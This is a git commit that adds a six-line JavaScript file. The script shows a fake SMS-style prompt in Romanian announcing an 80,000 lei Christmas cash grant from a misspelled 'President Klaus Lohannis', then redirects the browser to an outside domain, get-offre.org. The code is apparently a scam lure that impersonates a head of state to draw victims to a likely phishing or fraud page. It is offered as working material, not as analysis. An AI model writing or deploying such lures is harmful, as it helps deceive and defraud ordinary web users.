3b4ac6b85c6b4c1ccc9e92c72948a7dcaa608c2c
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-14 20:52:11 -0800

    Create romania-active.js

---
+++ romania-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETRAGE 80.000 RON'
+password=prompt('SMS: Felicitări, sunteți calificat pentru a obține SUBVENȚIA NUMERARĂ DE Crăciun de 80.000 lei Președinte KLAUS LOHANNIS PENTRU ROMÂNI. Vă rugăm să apăsați pe OK pentru a retrage Grantul în numerar de X-MAS   ','RETRAGE 80.000 RON');
+if (password != 'RETRAGE 80.000 RON') {
+location.href='https://get-offre.org/romania-grant.html';
+}
